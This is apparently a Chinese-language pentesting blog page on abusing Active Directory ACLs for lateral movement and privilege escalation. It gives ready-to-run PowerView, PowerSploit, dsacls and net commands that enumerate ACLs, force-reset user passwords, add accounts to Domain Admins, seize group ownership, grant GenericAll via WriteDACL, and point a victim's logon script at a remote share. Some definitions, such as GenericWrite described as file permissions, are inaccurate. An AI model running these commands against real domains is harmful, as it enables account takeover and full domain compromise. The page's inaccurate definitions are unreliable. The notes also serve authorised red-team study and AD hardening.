<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>利用acl进行横向 - ConsT27's Blog</title>
    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u5229\u7528acl\u8fdb\u884c\u6a2a\u5411", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "\u67e5\u770bacl", url: "#acl_1" },
              {title: "\u5229\u7528", url: "#_2" },
          ]},
        ];

    </script>
    <script src="../../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
        域权限维持通用方法总汇
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
        windows内网渗透常用命令总汇
      </a>
    </div>
    
  </div>

    

    <h1 id="acl">利用acl进行横向</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#查看acl">查看acl</a><ul>
<li><a href="#GUID转换脚本">GUID转换脚本</a></li>
</ul>
</li>
<li><a href="#利用">利用</a><ul>
<li><a href="#GenericAll">GenericAll</a><ul>
<li><a href="#genericall-on-user">genericall on user</a></li>
<li><a href="#genericall-on-group">genericall on group</a></li>
</ul>
</li>
<li><a href="#writeproperty">writeproperty</a></li>
<li><a href="#Self-Membership">Self-Membership</a><ul>
<li><a href="#Self-Membership">Self-Membership</a></li>
</ul>
</li>
<li><a href="#ForceChangePassword">ForceChangePassword</a></li>
<li><a href="#writeowner">writeowner</a></li>
<li><a href="#GenericWrite">GenericWrite</a></li>
<li><a href="#writeDACL">writeDACL</a></li>
</ul>
</li>
</ul>
<p>访问控制列表 (ACL) 是访问控制条目 (ACE) 的列表。ACL 中的每个 ACE 都标识一个受托者，并为该受托者指定允许、拒绝或审计的访问权限。</p>
<h2 id="acl_1">查看acl</h2>
<p>1.</p>
<p>需要下载rsat包（Remote Server Administration Tools ）</p>
<pre><code class="language-纯文本">import-module ActiveDirectory
(Get-Acl -Path &quot;AD:CN=bob,CN=Users,DC=cia,DC=gov&quot;).access

</code></pre>
<p><img alt="" src="../image/image_Uxs3BRiQkL.png" /></p>
<p>在IdentityReference字段可以看到Apache用户对bob有GenericAll权限</p>
<p>2.</p>
<p>powerview</p>
<pre><code class="language-纯文本">查看谁对bob有genericall权限
Get-ObjectAcl -samAccountName bob -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;}

查看bob对哪个用户有权限
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq &quot;bob&quot;}
若poweiview没有IdentityReference属性
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq &quot;SID-xxx-x-x-x-xx&quot;}

查看任何用户对某用户组的权限
在distinguishedname中找到某用户组的对ldap路径
Get-NetGroup &quot;domain admins&quot; -FullData 
进行acl查询
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq &quot;CN=Domain Admins,CN=Users,DC=offense,DC=local&quot;}

</code></pre>
<p>缺点：有可能看不到这个权限是谁拥有的(IdentityReference字段看不到)。但可以根据SecurityIdentifier指向的sid知道是谁作用于bob</p>
<p><img alt="" src="../image/image_ClaGZnLFU4.png" /></p>
<p>3.</p>
<pre><code class="language-纯文本">dsacls &quot;CN=bob,CN=Users,DC=cia,DC=gov&quot;

</code></pre>
<p><img alt="" src="../image/image_GluWPvATHn.png" /></p>
<p>比较明了</p>
<p>4.</p>
<p><a href="https://github.com/tevora-threat/SharpView" title="https://github.com/tevora-threat/SharpView">https://github.com/tevora-threat/SharpView</a></p>
<pre><code class="language-纯文本">sharpview.exe Invoke-ACLScanner -ResolveGUIDs
</code></pre>
<p>5.</p>
<pre><code class="language-纯文本">Import-Module ActiveDirectory
cd AD:
$Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com'
$Acl.Access.Count
$Acl.Access | where IdentityReference -match 'Domain Users'. //定义查询谁拥有此权限？
</code></pre>
<p><img alt="" src="../image/image_A783ETrKuZ.png" /></p>
<h3 id="guid">GUID转换脚本</h3>
<p>powershell</p>
<p>需要下载rsat包</p>
<pre><code class="language-纯文本">$ObjectTypeGUID = @{}

$GetADObjectParameter=@{
    SearchBase=(Get-ADRootDSE).SchemaNamingContext
    LDAPFilter='(SchemaIDGUID=*)'
    Properties=@(&quot;Name&quot;, &quot;SchemaIDGUID&quot;)
}

$SchGUID=Get-ADObject @GetADObjectParameter
    Foreach ($SchemaItem in $SchGUID){
    $ObjectTypeGUID.Add([GUID]$SchemaItem.SchemaIDGUID,$SchemaItem.Name)
}

$ADObjExtPar=@{
    SearchBase=&quot;CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)&quot;
    LDAPFilter='(ObjectClass=ControlAccessRight)'
    Properties=@(&quot;Name&quot;, &quot;RightsGUID&quot;)
}

$SchExtGUID=Get-ADObject @ADObjExtPar
    ForEach($SchExtItem in $SchExtGUID){
    $ObjectTypeGUID.Add([GUID]$SchExtItem.RightsGUID,$SchExtItem.Name)
}

$ObjectTypeGUID | Format-Table -AutoSize

$ObjectTypeGUID[[GUID]'bf967961-0de6-11d0-a285-00aa003049e2']
</code></pre>
<p>作用情况：</p>
<p><img alt="" src="../image/image_X0DW8vDyX3.png" /></p>
<p>表示CIA\Exchange Trusted Subsystem对bob用户的GUID为bf967a06-0de6-11d0-a285-00aa003049e2（objecttype）的属性有WriteProperty权限。但是这个guid指向的是哪一个属性呢？就可以用这个脚本转化出来。</p>
<p>powerview的SecurityIdentifier也可以解出来看谁有这个权限。</p>
<h2 id="_2">利用</h2>
<p>不安全的配置导致权限提升</p>
<pre><code class="language-纯文本">ForceChangePassword：强制改变当下的密码

AddMembers：可以对目标组添加用户（包括自己的账户）

GenericAll：完全控制对象，包括更改密码、注册SPN、添加AD对象到目标组里面

GenericWrite:更改目标写入参数，导致下次用户登录脚本就要执行

WriteOwne：更新目标对象的所有者，可以让自己成为所有者

WriteDACL：更新对面的DACL，将ACL写入对面实体，直接授予我们的账户对对象的完全控制权

AllExtendedRights：能够对目标对象执行与扩展 AD 权限相关的任何操作。例如，这包括强制更改用户密码的能力。
</code></pre>
<h3 id="genericall">GenericAll</h3>
<p>完全控制权限</p>
<h4 id="genericall-on-user">genericall on user</h4>
<pre><code class="language-纯文本">Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;}  
</code></pre>
<p>看到bob对delegate用户有genericall权限</p>
<p><img alt="" src="../image/image_3j4GdDKTW2.png" /></p>
<pre><code class="language-纯文本">直接修改密码即可
net user delegate password /domain
</code></pre>
<h4 id="genericall-on-group">genericall on group</h4>
<p>查看某个组的ldap字符串</p>
<pre><code class="language-纯文本">Get-NetGroup &quot;domain admins&quot; -FullData
</code></pre>
<p><img alt="" src="../image/image_g8zTKdj8QC.png" /></p>
<p>查看该用户组的dacl</p>
<pre><code class="language-纯文本"> Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq &quot;CN=Domain Admins,CN=Users,DC=offense,DC=local&quot;}
</code></pre>
<p><img alt="" src="../image/image_X5TURjvoJY.png" /></p>
<p>&#x20;如果对一个组有genericall权限，就可以把自己加进去，对于管理员组来说，加进去就成了管理员。</p>
<pre><code class="language-纯文本">net group &quot;domain admins&quot; spotless /add /domain
</code></pre>
<p>也有一些其它的添加用户命令，但都需要一些脚本依赖</p>
<pre><code class="language-纯文本"># with active directory module
Add-ADGroupMember -Identity &quot;domain admins&quot; -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;
</code></pre>
<h3 id="writeproperty">writeproperty</h3>
<p>可以写其它用户的属性。</p>
<p>如果可以对某个组写全部属性</p>
<p><img alt="" src="../image/image_jAhpLcugpE.png" /></p>
<p>那么就可以把该用户直接加入此用户组</p>
<pre><code class="language-纯文本">Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;
or
net group &quot;domain admins&quot; spotless /add /domain

</code></pre>
<h3 id="self-membership">Self-Membership</h3>
<p>"Self-Membership是一种权限，它允许用户自己管理自己的成员身份。具体来说，Self-Membership权限允许用户添加或删除自己作为某个组织、团队或项目的成员。这意味着用户可以自主决定加入或离开特定的组织、团队或项目，而无需管理员或其他成员的干预。Self-Membership权限通常用于提供更大的自由度和灵活性，使用户能够自主管理自己的成员身份。"</p>
<h4 id="self-membership_1">Self-Membership</h4>
<p>如果对某个组有这个权限，且activedirectoryRights为self或者有writeproperty，也可以把自己拉进该用户组</p>
<p><img alt="" src="../image/image_5ZHQDu2vjL.png" /></p>
<p><img alt="" src="../image/image_bjsaeOX1oY.png" /></p>
<pre><code class="language-纯文本">Add-NetGroupUser -UserName spotless -GroupName &quot;domain admins&quot; -Domain &quot;offense.local&quot;
or
net group &quot;domain admins&quot; spotless /add /domain
</code></pre>
<h3 id="forcechangepassword">ForceChangePassword</h3>
<p>如果我们对某用户有该权限，就可以直接改他的密码</p>
<p><img alt="" src="../image/image_MkjdQl5gaX.png" /></p>
<pre><code class="language-纯文本">powersploit

Set-DomainUserPassword -Identity delegate -Verbosed
或者
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose

上面指令不能一步到位，因为中间会有问询提示输入密码。用下面这个方法就可以直接改了
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

</code></pre>
<h3 id="writeowner">writeowner</h3>
<p>如果当前用户对某个组有该权限，我们可以将该组的object's owner改为自己，从而控制该组，比如可以把其它用户添加进该组。</p>
<pre><code class="language-纯文本">Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq &quot;CN=Domain Admins,CN=Users,DC=offense,DC=local&quot; -and $_.IdentityReference -eq &quot;OFFENSE\spotless&quot;}
</code></pre>
<p><img alt="" src="../image/image_YMDCv2WHj0.png" /></p>
<pre><code class="language-纯文本">powersploit
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity &quot;spotless&quot; -Verbose

</code></pre>
<p>sid获取</p>
<pre><code class="language-纯文本">wmic group where name=&quot;Domain Admins&quot; get name,sid,domain
</code></pre>
<h3 id="genericwrite">GenericWrite</h3>
<p>"GenericWrite" 权限是指对文件或文件夹进行写入操作的权限。具体来说，它允许用户对文件或文件夹进行以下操作： &#x20;</p>
<ol>
<li>创建文件或文件夹。 &#x20;</li>
<li>修改文件内容或文件夹属性。 &#x20;</li>
<li>删除文件或文件夹。 &#x20;</li>
<li>重命名文件或文件夹。</li>
</ol>
<p>如果对某用户有genericwrite权限，且objecttype为script-path。那么就可以修改该用户的login script，当该用户下次登录的时候，我们写入其login script的恶意脚本就会被触发</p>
<p><img alt="" src="../image/image_MWjhSERt6s.png" /></p>
<pre><code class="language-纯文本">Module:ActiveDirectory

Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue &quot;\\10.0.0.5\totallyLegitScript.ps1&quot;
</code></pre>
<h3 id="writedacl">writeDACL</h3>
<p>如果a对b有writedacl权限，那么可以a可以向b的acl写入genericall权限来实现完全控制，从而接管b用户。</p>
<p>如果a对某用户组有writeacl权限，也可以使a对该组有genericall权限并把a用户加入到该组</p>
<p>可用dsacls或powersploit</p>
<pre><code class="language-纯文本">让Brandi.Khan获得对Carol.Dean的genericall权限
dsacls &quot;\\10.0.1.100\CN=Carol.Dean,CN=Users,DC=pwn,DC=local&quot; /I:T /G &quot;pwn\Brandi.Khan:GA&quot;

</code></pre>
<pre><code class="language-纯文本">使test1获得对bob的genericall权限
Add-DomainObjectAcl -TargetIdentity 'bob' -PrincipalIdentity test1 -Rights All


Add-DomainObjectAcl -TargetIdentity &quot;IT Desk&quot; -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose
Add-DomainGroupMember -Identity &quot;IT Desk&quot; -Members snovvcrash -Verbose

</code></pre>
<pre><code class="language-纯文本">$ADSI = [ADSI]&quot;LDAP://CN=test,CN=Users,DC=offense,DC=local&quot; //可被修改acl的对象的ldap路径
$IdentityReference = (New-Object System.Security.Principal.NTAccount(&quot;Username&quot;)).Translate([System.Security.Principal.SecurityIdentifier])//定义谁会获得这个组的权限
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,&quot;GenericAll&quot;,&quot;Allow&quot; //定义授予权限为genericall
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
</code></pre>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
        域权限维持通用方法总汇
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
        windows内网渗透常用命令总汇
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>